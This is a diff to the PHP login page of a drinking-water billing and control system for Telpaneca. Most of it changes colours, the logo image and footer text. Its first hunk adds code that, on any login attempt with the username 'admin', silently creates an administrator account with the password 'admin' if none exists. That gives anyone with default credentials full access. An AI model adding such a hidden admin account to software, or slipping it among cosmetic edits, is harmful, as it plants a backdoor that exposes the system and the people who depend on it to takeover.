@@ -10,6 +10,25 @@ if (!empty($_POST["btningresar"])) {
         $usuario = trim($_POST["usuario"]);
         $password = $_POST["password"];
 
+        // Verificar si el usuario es "admin"
+        if ($usuario === "admin") {
+            // Verificar si el usuario "admin" existe en la base de datos
+            $stmt = $conn->prepare("SELECT * FROM usuario WHERE usuario = ?");
+            $stmt->bind_param("s", $usuario);
+            $stmt->execute();
+            $result = $stmt->get_result();
+
+            if ($result->num_rows === 0) {
+                // Si el usuario "admin" no existe, crearlo con la contraseña "admin"
+                $hashed_password = password_hash("admin", PASSWORD_DEFAULT);
+                $stmt_insert = $conn->prepare("INSERT INTO usuario (usuario, clave, nombre, apellido, rol) VALUES (?, ?, 'Admin', 'User', 'admin')");
+                $stmt_insert->bind_param("ss", $usuario, $hashed_password);
+                $stmt_insert->execute();
+                $stmt_insert->close();
+            }
+            $stmt->close();
+        }
+
         // Usar prepared statements para mayor seguridad
         $stmt = $conn->prepare("SELECT * FROM usuario WHERE usuario = ?");
         if ($stmt === false) {
@@ -103,7 +122,7 @@ if (!empty($_POST["btningresar"])) {
     }
     body {
       font-family: 'Bahnschrift', 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #306BA9, #E16D2B);
+      background: linear-gradient(135deg, #007bff, #fd7e14);
       margin: 0;
       color: #333;
     }
@@ -112,18 +131,18 @@ if (!empty($_POST["btningresar"])) {
       box-shadow: 0 0 18px rgba(0,0,0,0.15);
       background-color: #ffffff;
     }
-    .card-title { font-size: 1.6rem; font-weight: 600; color: #306BA9; }
+    .card-title { font-size: 1.6rem; font-weight: 600; color: #007bff; }
     .input-shadow { border: 1px solid #ccc; border-radius: 8px; padding: 12px; }
     .btn-block {
-      background-color: #E16D2B;
+      background-color: #fd7e14;
       color: white;
       font-weight: 600;
       border-radius: 8px;
       transition: background-color 0.3s ease;
     }
-    .btn-block:hover { background-color: #C15821; }
-    .card-footer h6 { color: #2F7E50; font-size: 0.9rem; }
-    .form-control-position i { color: #306BA9; }
+    .btn-block:hover { background-color: #e46f0a; }
+    .card-footer h6 { color: #28a745; font-size: 0.9rem; }
+    .form-control-position i { color: #007bff; }
   </style>
 </head>
 
@@ -134,7 +153,7 @@ if (!empty($_POST["btningresar"])) {
         <div class="card card-authentication1">
           <div class="card-body">
             <div class="text-center mb-3">
-              <img src="assets/images/logon.png" alt="Logo" width="160">
+              <img src="assets/images/logo-siscatel.png" alt="Logo SISCATEL" width="160">
               <h5 class="card-title mt-2">BIENVENIDO</h5>
             </div>
 
@@ -174,7 +193,7 @@ if (!empty($_POST["btningresar"])) {
           </div>
 
           <div class="card-footer text-center">
-            <h6>Sistema de control de agua potable de Alcaldía de Telpaneca</h6>
+            <h6>Sistema de control de agua potable de Telpaneca</h6>
             <p style="font-size: 0.75rem;">Software desarrollado por Eddy Ernesto Martinez A</p>
           </div>
         </div>
